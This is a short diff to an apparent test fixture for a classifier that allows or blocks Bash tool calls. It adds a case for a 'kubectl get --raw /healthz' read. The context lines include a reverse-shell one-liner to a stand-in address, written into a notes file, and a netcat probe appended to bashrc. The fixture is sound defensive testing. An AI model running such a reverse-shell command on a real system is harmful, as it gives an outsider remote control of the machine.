@@ -380,3 +380,4 @@
 {"tool": "Bash", "args": {"command": "cat >> ~/.bashrc <<'EOF'\nexport PATH=$PATH:~/bin\nEOF"}, "expect": "allow", "note": "an ordinary heredoc edit to bashrc stays as it is (#996)"}
 {"tool": "Bash", "args": {"command": "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF"}, "expect": "allow", "note": "a heredoc body starting a network shell, written to a plain file (#996)"}
 {"tool": "Bash", "args": {"command": "cat >> ~/.bashrc <<'EOF'\nnc -zv localhost 80\nEOF"}, "expect": "allow", "note": "a heredoc body with a netcat probe and no exec option stays as it is (#996)"}
+{"tool": "Bash", "args": {"command": "kubectl get --raw /healthz"}, "expect": "allow", "note": "#981: --raw of a path with no /secrets/ segment reads no secret"}
